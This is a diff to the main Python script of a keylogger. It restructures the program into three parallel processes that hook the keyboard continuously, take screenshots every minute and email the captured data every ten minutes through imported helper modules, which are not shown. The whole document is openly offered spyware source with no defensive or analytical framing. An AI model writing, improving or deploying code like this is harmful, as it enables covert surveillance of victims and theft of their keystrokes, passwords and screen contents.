@@ -1,21 +1,37 @@
 import Hook_Keyboard
 import PrintScreen
 import Email_Connection
-import schedule
 import multiprocessing
+import time
 
 
 def keylogger():
-    Hook_Keyboard.hook_keyboard()
+    while True:
+        Hook_Keyboard.hook_keyboard()
 
 
-process = multiprocessing.Process(target=keylogger())
-schedule.every(10).seconds.do(PrintScreen.take_screen)
-schedule.every(1).minutes.do(Email_Connection.sendmail)
-process.start()
-
-while True:
-    schedule.run_pending()
+def screen():
+    while True:
+        time.sleep(60)
+        PrintScreen.take_screen()
 
 
+def email():
+    while True:
+        time.sleep(600)
+        Email_Connection.sendmail()
 
+
+if __name__ == "__main__":
+
+    proces_3 = multiprocessing.Process(target=email)
+    proces_2 = multiprocessing.Process(target=screen)
+    proces_1 = multiprocessing.Process(target=keylogger)
+
+    proces_3.start()
+    proces_2.start()
+    proces_1.start()
+
+    proces_3.join()
+    proces_2.join()
+    proces_1.join()
